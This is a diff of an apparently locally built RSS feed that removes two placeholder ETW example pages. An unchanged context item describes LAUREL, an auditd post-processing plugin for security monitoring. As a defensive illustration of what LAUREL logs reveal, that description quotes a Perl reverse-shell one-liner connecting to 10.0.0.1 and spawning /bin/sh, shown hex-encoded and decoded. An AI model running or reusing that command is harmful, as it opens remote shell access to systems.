@@ -30,20 +30,6 @@
       <description>LAUREL is an event post-processing plugin for auditd(8) to improve its usability in modern security monitoring setups.&#xA;Why? Instead of audit events that look like this…&#xA;type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0=&amp;#34;perl&amp;#34; a1=&amp;#34;-e&amp;#34; a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B65742… …turn them into JSON logs where the mess that your pen testers/red teamers/attackers are trying to make becomes apparent at first glance:&#xA;{ [...] &amp;#34;EXECVE&amp;#34;: { &amp;#34;argc&amp;#34;: 3, &amp;#34;ARGV&amp;#34;: [ &amp;#34;perl&amp;#34;, &amp;#34;-e&amp;#34;, &amp;#34;use Socket;$i=\&amp;#34;10.0.0.1\&amp;#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&amp;#34;tcp\&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&amp;#34;&amp;gt;&amp;amp;S\&amp;#34;);open(STDOUT,\&amp;#34;&amp;gt;&amp;amp;S\&amp;#34;);open(STDERR,\&amp;#34;&amp;gt;&amp;amp;S\&amp;#34;);exec(\&amp;#34;/bin/sh -i\&amp;#34;);};&amp;#34; ] }, [...] } This happens at the source.</description>
     </item>
     <item>
-      <title>ETW Example Page</title>
-      <link>http://localhost:1313/docs/etw/example/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/etw/example/</guid>
-      <description>Text can be bold, italic, or strikethrough. Links should be blue with no underlines (unless hovered over).&#xA;There should be whitespace between paragraphs. There should be whitespace between paragraphs. There should be whitespace between paragraphs. There should be whitespace between paragraphs.&#xA;struct _KGATE { _DISPATCHER_HEADER Header; ULONG ProviderId; GUID ProviderGuid; }; There should be no margin above this first sentence.&#xA;Blockquotes should be a lighter gray with a border along the left side in the secondary color.</description>
-    </item>
-    <item>
-      <title>Internals Example Page</title>
-      <link>http://localhost:1313/docs/etw/internals/example/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/etw/internals/example/</guid>
-      <description></description>
-    </item>
-    <item>
       <title>Search Results</title>
       <link>http://localhost:1313/search/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
